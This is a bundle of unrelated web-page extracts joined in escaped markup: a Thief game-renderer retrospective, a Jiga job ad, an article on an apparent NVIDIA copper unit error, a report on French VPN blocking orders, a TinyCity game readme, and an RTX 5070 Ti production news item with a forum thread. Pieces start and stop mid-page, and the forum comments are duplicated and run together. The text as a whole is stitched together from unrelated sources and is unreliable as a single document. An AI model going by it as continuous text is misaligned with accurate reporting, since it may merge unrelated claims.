    &lt;p&gt;It was also used to color the water surface--the water surface actually used a purely transparent texture and surfaces underwater were colored while they were rendered, instead of having to use the "translucent" read-modify-write mapper. This means the object renderers also needed to support rendering with a clut; I don't remember the details since I didn't work on those, but this was probably something we tended to support by default anyway, so I doubt this was problematic for those renderers.&lt;/p&gt;
    &lt;p&gt;I'm not sure what happened for objects that stuck through the water surface; I guess those were forced to use the dynamic user clip plane path. Because Quake used a z-buffer, Quake couldn't have both a distant wall-underwater and the water surface visible at the same pixel (the z-buffer could only store one depth), so the Quake water surface was opaque, at least in the software renderer. I'm not sure what Quake-derived engines like Half-Life did; one expensive solution would be to render the world except the water, then render the objects, then finally render the transparent water through the z-buffer (much as we do with hardware). The z-buffered transparent water effect would have been much more expensive in pixel costs than Thief's approach, although Thief was spending more effort per triangle/vertex having to render the object multiple times.&lt;/p&gt;
    &lt;p&gt;In Thief, most world surfaces simply used the arbitrary-pitch no-wrapping sampler and the plain store-to-memory writer.&lt;/p&gt;
    &lt;p&gt;I imagine that the object renderers used the shared LGS software rendering libraries and so didn't use these mappers at all.&lt;/p&gt;
    &lt;p&gt;I didn't write all the graphics technology used in Thief. I'll call out the things I didn't write below. I associate each of them with someone at LGS who did the work, but I'm not sure the people I can think of were the only contributors to that effort, so rather than risk missing important people out, I'm just not going to name names if multiple people might have been involved.&lt;/p&gt;
    &lt;p&gt;The 3D camera system, vertex transformation, and clipping processing were part of a shared technology library used by all LGS products. (Thief may have been the first customer of that tech--previous games having used fixed-point so they could run on x86 computers without floating point acceleration.) Thief batched together all the vertices used in a single cell and transformed them all at once, whether they were visible polygons or portals, which was possible since the 3D vertex API allowed separating things out like that. (Sort of like compiled vertex arrays.)&lt;/p&gt;
    &lt;p&gt;As noted before, general object rendering presumably also went through shared libraries. Object polygons were sorted using a BSP tree; James Fleming had written a very clever system that significantly reduced the number of BSP node decisions that needed to be made, based on the fact that single-sided polygons often couldn't occlude each other from any angle. (For example, I believe a polygonal torus, which is an object that self-occludes and needs sorting if the polygons are two-sided, can be statically sorted if it's made of single-sided polygons.)&lt;/p&gt;
    &lt;p&gt;Most importantly, Thief used character skinning with skeletal animation to render its characters, and I never touched a single line of code of that system.&lt;/p&gt;
    &lt;p&gt;I quit Looking Glass for a time; during my absence hardware acceleration support was added. (I came back and added support for colored lighting in the lighting generator and maybe the surface cache or something.)&lt;/p&gt;
  &lt;/main&gt;

    &lt;p&gt;We’re building tools that help NASA, Tesla, Google, and hundreds of top teams bring the future to life. Can you help us make it even better?&lt;/p&gt;
    &lt;p&gt;If you’re into engineering and building physical products, you probably know the sourcing grind. You email a few suppliers, wait days for quotes, answer the same questions twice (or ten times). Track everything in spreadsheets, deal with logistics, revisions, customs (you gotta love new tariffs every week), forms, reports and surprising delays.&lt;/p&gt;
    &lt;p&gt;It’s expensive, slow, tedious and painful – and it pulls you away from actual engineering work.&lt;/p&gt;
    &lt;p&gt;Jiga fixes that. We connect engineers directly with vetted manufacturers, handle quoting and communication in one place, build AI workflows to deal with the administrative work, and give full visibility into every order from prototype into mass production. What used to take weeks now takes hours.&lt;/p&gt;
    &lt;p&gt;We build the platform the manufacturing industry has been craving for years, and we’re aiming for the moon.&lt;/p&gt;
    &lt;p&gt;Most companies talk about transparency and trust. We actually do it.&lt;/p&gt;
    &lt;p&gt;1. We share the numbers. As a team member, you’ll see the full picture: revenue, valuation, runway, roadmap, sales pipeline, what’s working and what fails.&lt;/p&gt;
    &lt;p&gt;2. We have been remote and async from day one and we love it. But we also love our team: once a year we bring everyone together to a small offsite in paradise for co-working, hiking, eating, drinking and sailing.&lt;/p&gt;
    &lt;p&gt;3. We don’t count hours, we track performance. You are senior enough to know what it means, we don’t need to explain.&lt;/p&gt;
    &lt;p&gt;4. We don’t do busy-work. We meet for a weekly all-hands and a team sync. That’s it. Everything else is async. Your calendar will be empty to write code, talk to customers or to fix problems.&lt;/p&gt;
    &lt;p&gt;5. We deliver 11/10 customer experience. We don’t settle for “good enough.” Quick response times, going the extra mile, creating fans not just users. It’s part of our DNA.&lt;/p&gt;
    &lt;p&gt;6. We decide fast. The person closest to the problem makes the call. No approval chains, no review committees and no endless layers of management.&lt;/p&gt;
    &lt;p&gt;7. Profitability is freedom. We are cashflow positive, growing revenue by 3x YoY. No desperate fundraising, no panic pivots, no mass layoffs. The magic we’re building is being built to last for long time.&lt;/p&gt;
    &lt;p&gt;8. “Don’t drink the Kool-Aid” is our motto. If you see something that needs fixing, it’s your duty to raise a flag or just fix it yourself.&lt;/p&gt;
    &lt;p&gt;9. We hire the best people. We’ve gathered a super group of the best talents in engineering, supply chain and sales. Everyone knows what they need to do and cruising through it.&lt;/p&gt;
    &lt;p&gt;10. Ship now, iterate later. Perfection is the enemy of done. We’d rather learn from something that is live on production, than debate something theoretical.&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;
    &lt;p&gt;There is a fine line between a structural bull case and a physical impossibility; at least in the media and some overly-enthusiastic analysts.&lt;/p&gt;
    &lt;p&gt;Recently, Forbes dug up a technical paper from Nvidia that was first published in May and it has been circulating through research notes and AI training sets, originally sourced from an NVIDIA technical brief. The claim from Nvidia suggests -- it's still on their website -- that the rack busbars in a single 1 gigawatt (GW) data center could require up to half a million tons of copper.&lt;/p&gt;
    &lt;quote&gt;The physics of using 54 VDC in a single 1 MW rack requires up to 200 kg of copper busbar. The rack busbars alone in a single 1 gigawatt (GW) data center could require up to half a million tons of copper. Clearly current power distribution technology isn’t sustainable in a GW data center future.&lt;/quote&gt;
    &lt;p&gt;Tat sounds like the ultimate catalyst for the commodities market and copper has been hitting records. In reality, it is a cautionary tale about the importance of primary research in an era of automated headlines.&lt;/p&gt;
    &lt;p&gt;If the "half a million tons" figure were accurate, a single 1 GW data center would consume 1.7% of the world's annual copper supply. If we built 30 GW of capacity—a reasonable projection for the AI build-out—that sector alone would theoretically absorb almost half of all the copper mined on Earth.&lt;/p&gt;
    &lt;p&gt;Thunder Said Energy today is flagging the math, which makes them "quite convinced that NVIDIA has made an innocent typo in its statement above, and must in fact mean "half a million pounds of copper", a number that is 2,200x smaller."&lt;/p&gt;
    &lt;p&gt;It should have never got to this point and it's understandable that journalists would run with it but the numbers were also touted by The Copper Development Association, who should know better.&lt;/p&gt;
    &lt;p&gt;When you even look at the Nvidia report itself, the error becomes clear with some simple math. It says standard rack architectures use approximately 200kg of copper per megawatt.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;1 GW (1,000 MW) x 200kg = 200,000kg&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;200,000kg = 200 Metric Tons.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The discrepancy between 200 tons (the reality) and 500,000 tons (the claim) is a factor of 2,500x. It is almost certain that the original document intended to say "half a million pounds"—which equates to roughly 226 tons—and a simple unit conversion error.&lt;/p&gt;
    &lt;p&gt;That this number was circulated so widely is worrisome if you're a copper bull (as I have been for years). We are certainly headed towards undersupply and it can't be fixed because of long build and permitting timelines for mines. But that's not a problem for 2026 and so with prices rising and a reach-for-headlines, there is a risk that it's over-inflated in the short term.&lt;/p&gt;
    &lt;p&gt;That's something Goldman Sachs warned about late last year when they said any copper breakout will be short lived.&lt;/p&gt;
    &lt;p&gt;The real bull case for copper remains compelling. Between grid upgrades, EV expansion, and data center cooling systems, the upside demand is estimated at a very healthy 400,000 to 800,000 tons per year. That is a significant, market-tightening figure—but it is a far cry from the accidental "copper apocalypse" suggested by the typo.&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;
    &lt;p&gt;Since 2024, the Paris Judicial Court has expanded the typical piracy site blocking orders beyond Internet providers.&lt;/p&gt;
    &lt;p&gt;Initially, rightsholders set their aim at DNS resolvers. This resulted in orders targeted at Cloudflare, Google, and others, requiring them to actively block access to pirate sites through their public DNS resolvers.&lt;/p&gt;
    &lt;p&gt;These blocking expansions were requested by sports rights holders, covering Formula 1, football Ligue 1, MotoGP, and other major sporting brands. They claimed that public DNS resolvers could help users to bypass existing ISP blockades, and the court agreed.&lt;/p&gt;
    &lt;p&gt;Last year, rightsholders cast their net even wider by targeting VPN providers with similar blocking demands. Again, the Paris Court acknowledged the threat of circumvention, ordering CyberGhost, ExpressVPN, NordVPN, ProtonVPN, and Surfshark to start blocking access to specific websites in France.&lt;/p&gt;
    &lt;head rend="h2"&gt;VPN Blocking Expands&lt;/head&gt;
    &lt;p&gt;The VPN blocking effort was not a one-off. After the first order was granted in May, more followed in June and July. These additional orders target various sports piracy sites as requested by the French entertainment powerhouse Canal Plus (SECP) and beIN Sports.&lt;/p&gt;
    &lt;p&gt;After this initial barrage, the blocking activity seemed to have quieted down, but it is far from over. On December 18, the Paris Judicial Court issued a new blocking order. This time around, the French top football league (LFP) and its commercial arm are the requesting parties.&lt;/p&gt;
    &lt;p&gt;As in previous orders, ProtonVPN, Nordvpn, Cyberghost, Surfshark and ExpressVPN are the main targets. These VPN providers have to block access to several domains that provide access to pirated sports streams.&lt;/p&gt;
    &lt;p&gt;The order covers 13 initial domains, including miztv.top, strikeout.im, and prosmarterstv.com. However, it is a ‘dynamic’ order in the sense that, through the overseeing body ARCOM, LFP can add new domains in case additional mirrors and proxies are launched. These blocks remain active for the entire 2025/2026 football season.&lt;/p&gt;
    &lt;p&gt;The court concludes that these VPNs help people to bypass existing site-blocking measures, rendering ISP blocking ineffective. While the VPN blockades are no silver bullet, combined with other blocking measures they should make it more difficult to access these pirate sites.&lt;/p&gt;
    &lt;head rend="h2"&gt;The No-Log Defense&lt;/head&gt;
    &lt;p&gt;All VPN providers, except ProtonVPN, appeared in court to argue a defense. They raised various arguments, with the “no-log” defense from Surfshark and NordVPN standing out.&lt;/p&gt;
    &lt;p&gt;Specifically, the VPNs argued that their “no-log” policy means they do not track user IP addresses or geolocate their users. Therefore, a court order to block access only for French users would violate their contractual obligations.&lt;/p&gt;
    &lt;p&gt;The court was not very receptive to this argument. Instead, it bluntly concluded that “the contractual stipulations binding VPN service providers to their clients cannot be invoked against [the plaintiffs] who have demonstrated an infringement of their rights.”&lt;/p&gt;
    &lt;p&gt;The court stressed that blocking the domains does not require the service to permanently store information on its users. The VPNs simply have to make sure that the sites are blocked from France.&lt;/p&gt;
    &lt;p&gt;In addition, the court rejected the notion that the blocking measures would constitute a “general monitoring obligation”, which is not allowed under the EU’s DSA, because the measures are limited to specific domains and end after the 2025-2026 football season.&lt;/p&gt;
    &lt;head rend="h2"&gt;Court Rejects Other Defenses&lt;/head&gt;
    &lt;p&gt;The VPNs also argued that their services don’t qualify as “technical intermediaries” under Article L. 333-10 of the Sports Code, but that was denied by the Paris court as well. The same applies to the proportionality and effectiveness arguments, which all failed.&lt;/p&gt;
    &lt;p&gt;The court’s logic throughout the order is that technical neutrality does not equal legal immunity.&lt;/p&gt;
    &lt;p&gt;By citing the DSA and the Sports Code, the judge effectively argues that VPN services can be key intermediaries in the piracy ecosystem. Therefore, they are legally obligated to act.&lt;/p&gt;
    &lt;p&gt;“Contrary to the assertions of Surfshark and NordVPN, the mere act of serving as a bridge to enable access to the pirate sites fulfills the function of transmission. Even if an intermediary acts in a passive, automatic, and neutral manner during the connection between internet domains, it nonetheless remains an essential agent in the transmission of data from one domain to another,” the (translated) order reads.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Happens Next?&lt;/head&gt;
    &lt;p&gt;The latest ruling confirms that VPN providers can be obligated to block pirate sites, at least in France. However, the final word hasn’t been said.&lt;/p&gt;
    &lt;p&gt;Speaking with TorrentFreak this week, a NordVPN spokesperson confirms that their appeal is already underway. The company did not directly explain how it complies with the court order but instead said that site-blocking measures are futile.&lt;/p&gt;
    &lt;p&gt;“While it may address superficial cases, it fails to tackle the root causes of piracy. Pirates can easily circumvent these blocks by using subdomains: blocking does not eliminate the content itself or reduce the incentives for piracy,” NordVPN notes.&lt;/p&gt;
    &lt;p&gt;“Effective piracy control should focus on eliminating the source of the content, targeting hosting providers, cutting off financing for illegal operations, and increasing the availability of legitimate content.”&lt;/p&gt;
    &lt;p&gt;In addition, NordVPN notes that, since the French order targets reputable VPNs, users may choose lower-quality free VPNs that will remain a loophole for pirates.&lt;/p&gt;
    &lt;p&gt;For now, however, the targeted VPN providers have to find a way to implement the blocking order. The court order doesn’t specify any technical measures, so they are free to do as they please, as long as the targeted sites are unavailable.&lt;/p&gt;
    &lt;p&gt;If the French VPN blockades are ultimately upheld, some providers may choose to leave the country entirely, but none have made this drastic step yet.&lt;/p&gt;

      &lt;p&gt;TinyCity is a city simulation game inspired by SimCity for the Raspberry Pi RP2040 running MicroPython&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Build and manage a growing metropolis in this tiny city sim. Balance zones and resources, hit milestones to gain bonuses and navigate disasters that are randomly generated.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;3 terrains to choose from or a randomly generated map&lt;/item&gt;
      &lt;item&gt;Residential, commercial, and industrial zoning&lt;/item&gt;
      &lt;item&gt;Budget management&lt;/item&gt;
      &lt;item&gt;Population growth &amp;amp; density, power grid, crime and pollution&lt;/item&gt;
      &lt;item&gt;Disaster system with random events&lt;/item&gt;
      &lt;item&gt;Milestones and hidden bonuses&lt;/item&gt;
      &lt;item&gt;Save/load functionality&lt;/item&gt;
      &lt;item&gt;Police &amp;amp; fire stations, power plants, stadiums, and more!&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Taxes are collected once per year&lt;/item&gt;
      &lt;item&gt;Click menu to view current budget and change tax rate&lt;/item&gt;
      &lt;item&gt;Add parks, trees and schools to attract new residents&lt;/item&gt;
      &lt;item&gt;Add fire and police stations to avoid crime and fight potential fires&lt;/item&gt;
      &lt;item&gt;Monitor pollution levels and heavy traffic to improve growth&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;TinyCity was heavily inspired by jhhoward/MicroCity for the Arduboy game platform. Thanks for all of the amazing work on MicroCity (and other titles).&lt;/p&gt;

  &lt;main&gt;&lt;p&gt;Thursday, January 15th 2026&lt;/p&gt;&lt;head rend="h1"&gt;NVIDIA Reportedly Ends GeForce RTX 5070 Ti Production, RTX 5060 Ti 16 GB Next&lt;/head&gt;&lt;p&gt;NVIDIA has reportedly stopped production of its mid-range GeForce RTX 5070 Ti graphics card, according to ASUS, one of the largest PC manufacturers. ASUS shared exclusive information with Hardware Unboxed, revealing that NVIDIA has created a supply shortage for the GeForce RTX 5070 Ti, effectively ending its production. As one of NVIDIA's largest AIB partners, ASUS has learned that the model is essentially in end-of-life status. The company noted the supply shortage and offered no further comments on availability or potential improvements in supply. Since retailers and manufacturers can't source enough stock of the GeForce RTX 5070 Ti GPUs, the shortage has led to significant price increases for these models and suggests that the future availability of this GPU SKU might be nonexistent.&lt;lb/&gt;The next phase of the silent production end is approaching for the GeForce RTX 5060 Ti 16 GB version, with resources reportedly being redirected to the lower-capacity GeForce RTX 5060 Ti 8 GB version. Stocks of the RTX 5060 Ti 16 GB SKU have been dwindling across retailers and distributors, and prices are beginning to reflect this scarcity. The massive industry DRAM shortage has affected even graphics GDDR7 memory. As a result, the lower-capacity 8 GB version will remain available until the supply chain and memory production improve. Yesterday's rumors also confirm that the regular RTX 5060 will be the priority card for NVIDIA going forward, for that segment.Additionally, ASUS provided information about the previously rumored CES launch of the RTX 50 "SUPER" refresh, which was expected to have higher memory capacity. According to the AIB, this launch did not occur, although the original plan was indeed for a CES launch, which was postponed. Currently, there are no plans to release a series refresh, and some AIBs have reportedly expressed frustration over the sudden change. It seems the rumor about the SUPER launch being postponed was true, with the primary reason being the shortage of high-capacity GDDR7 memory.&lt;/p&gt; Source: Hardware Unboxed &lt;p&gt;The next phase of the silent production end is approaching for the GeForce RTX 5060 Ti 16 GB version, with resources reportedly being redirected to the lower-capacity GeForce RTX 5060 Ti 8 GB version.

At least when that bubble burst there were lots of cheap GPUs available... now if the AI bubble pops or the big data centres rotate stock the 2nd hand market will be flooded with enterprise boards with no display outputs or game driver support.&lt;/p&gt;&lt;p&gt;Unreal.&lt;/p&gt;&lt;p&gt;Such a nice start to 2026. &lt;lb/&gt;Fingers crossed that AMD doesn't follow suit.&lt;/p&gt;&lt;p&gt;Fingers crossed that AMD doesn't follow suit.&lt;/p&gt;&lt;quote&gt;lambdaSuch a nice start to 2026.They simply don't make enough GPUs for them to end-of-line anything.&lt;lb/&gt;Fingers crossed that AMD doesn't follow suit.&lt;/quote&gt;&lt;quote&gt;ymdhisThey simply don't make enough GPUs for them to end-of-line anything.AMD has a stellar track record of snatching defeat from the jaws of victory.&lt;/quote&gt;&lt;p&gt;I wonder whether we'll even see the 6000 series from Nvidia this year, if so the prices will be astronomical.&lt;/p&gt;&lt;p&gt;Chance for Intel to step up.&lt;/p&gt;&lt;p&gt;All is good people, all is good.

I just sold my ram sticks and fortunately it was more than enough for one. :P&lt;/quote&gt;&lt;quote&gt;Hecate91I doubt it, not when Nvidia can sell people on "5080 performance" in the cloud, and 6X frame gen.“The Party told you to reject the evidence of your eyes and ears. It was their final, most essential command.”― George Orwell, 1984&lt;lb/&gt;Otherwise the jacket man wants everyone to buy 8GB gpu's again, while he told people to not criticize AI.&lt;/quote&gt;&lt;p&gt;So for the price of RTX 5060 (roughly 350$ USD) you could buy RX 9060 8GB with similar performance, RTX 3070 8GB with similar performance or Arc B580 12GB with around 80% of performance but at least it wont run out of VRAM. All that is as of time of writing, because who cares about consumer starving for reasonably priced electronics, send 3 billion dollars to AI datacenters.&lt;lb/&gt;Welcome to 2026 where performance per $ is as unpredictable as the stock market. If you happen to saw the light at the end of the tunnel is was a freight train.&lt;/p&gt;&lt;p&gt;Welcome to 2026 where performance per $ is as unpredictable as the stock market. If you happen to saw the light at the end of the tunnel is was a freight train.&lt;/p&gt;&lt;p&gt;I am waiting for Nvidia to promote 4GB cards again!&lt;/p&gt;&lt;p&gt;Pretty sure if you slice that 5050 die just right, you can get two great 4Gb RTX cards from it. So, things aren't all bad...&lt;/p&gt;&lt;p&gt;I mean if there's a silver lining in this, it's that maybe we will finally see development philosophies trend towards resource efficiency...&lt;lb/&gt;Ah, who am I kidding?&lt;/p&gt;&lt;p&gt;Ah, who am I kidding?&lt;/p&gt;&lt;p&gt;A new and “improved” 5050 6gb will save the day :roll:&lt;/p&gt;&lt;quote&gt;YouseethisA new and “improved” 5050 6gb will save the day :roll:With a new DLSS 4.6 Feature: "infinity AI memory", a new "AI-Powered" texture compression! "16gb of texture memory performance on your 5050 6gb"!&lt;/quote&gt;&lt;p&gt;Oh and AI, folks, you can not say it enough!&lt;/p&gt;&lt;p&gt;AI!&lt;/p&gt;&lt;p&gt;Intel, this is your opening moment! DON’T F$#K IT UP!&lt;/p&gt;&lt;quote&gt;Hecate91I doubt it, not when Nvidia can sell people on "5080 performance" in the cloud, and 6X frame gen.I thought the "for real, on god" would imply my not so rosy outlook for the future of game optimization ^^"&lt;lb/&gt;Otherwise the jacket man wants everyone to buy 8GB gpu's again, while he told people to not criticize AI.&lt;/quote&gt;&lt;quote&gt;soderDont have your hopes high.. that B770 seems to be a giant disappointment (300W+ TDP for such an abysmal perfomance) if the leaks are true, even if it will ever be released at all...Not sure what you consider "abyssal performance"...&lt;/quote&gt;&lt;p&gt;The most reliable rumors and leaks suggests the B770 is designed to compete in the upper mid-range to high bracket. It is expected to trade blows with the RTX 4070 and the RTX 5060 Ti easily. In certain titles, it may even approach RTX 5070 levels of performance, particularly at 1440p or 4K. With 32 dedicated Ray Tracing units, it will offer a significant uplift over the previous A770/B580, possibly closing the gap between NV's mid-tier RT performance. Plus, thanks to its large VRAM size; it should easily handle entry-level 4K gaming requirements. There are even strong rumors of a "Pro" model featuring 24GB or 32GB of VRAM.&lt;/p&gt;&lt;p&gt;Rumoured Specs:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;GPU Architecture: Xe2-HPG (BMG-G31/Battlemage)&lt;/item&gt;&lt;item&gt;Cores: 32 Xe2 Cores (4096 Shaders)&lt;/item&gt;&lt;item&gt;VRAM: 16GB GDDR6 (256-bit bus)&lt;/item&gt;&lt;item&gt;TDP: 300W (only 15% higher than a 7900 GRE)&lt;/item&gt;&lt;item&gt;Interface: PCIe 5.0 x16&lt;/item&gt;&lt;item&gt;Node: TSMC 4nm or 5nm&lt;/item&gt;&lt;/list&gt;&lt;p&gt;In addition, Intel is rumored to be preparing XeSS 3.0 to coincide with the B770 launch. Just like NVIDIA, Intel will offer its own high-quality updated frame generation tech ("DLSS 4.5 light").&lt;/p&gt;&lt;p&gt;With it recently being spotted in HP laptop driver files and GitHub repositories, despite Intel did not announcing the B770 at CES 2026; current theories suggest Intel is polishing drivers to ensure a smoother launch than prior releases. MSRP is approximately around that $399-449 sweet spot (in line with other cards of similar caliber).&lt;/p&gt;&lt;p&gt;Therefore, I'm not sure where you're getting your information from. However, everything is shaping up for this to be a perfect alternative to a 5060 Ti 16GB, 9060 XT 16GB, 5070 12GB, 4070 12GB, and 4070 Super 12GB. With XeSS 3.0 it will probably even trade blows with a 7900 GRE 16GB or 9070 GRE 12GB in optimized titles comparing Ray Tracing performance or simply in productivity workloads. As a complete package, offering new frame gen technology, and above adequate frame buffer, plus a more than acceptable price for what you're getting. The B770, if the current data is remotely accurate, will be a welcomed addition to the video card market.&lt;/p&gt;&lt;/main&gt;
